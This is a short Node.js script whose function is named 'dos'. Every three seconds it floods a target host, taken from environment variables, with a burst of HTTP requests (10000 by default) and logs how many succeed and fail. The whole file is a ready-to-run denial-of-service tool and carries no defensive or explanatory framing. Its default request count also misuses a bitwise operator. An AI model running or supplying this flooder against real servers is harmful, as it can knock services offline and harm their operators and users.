const req = require('request')
const dotenv = require('dotenv');

dotenv.config();

const targetUrl = `http://${process.env.HOST}`; // Replace with your target URL
const numRequests = process.env.COUNT | 10000; // Number of requests to send

function dos(url, qty, ms) {
    let err = ok = 0

    setInterval(_ => {

        for (let i = qty; i--;)
            req(url, error => !error ? ok++ : err++)

        console.log(`result:' ${ ok } ${ err }`)

        err = ok = 0

    }, ms)
}

function sendRequests() {
    dos(targetUrl, numRequests, 3000)
}

sendRequests();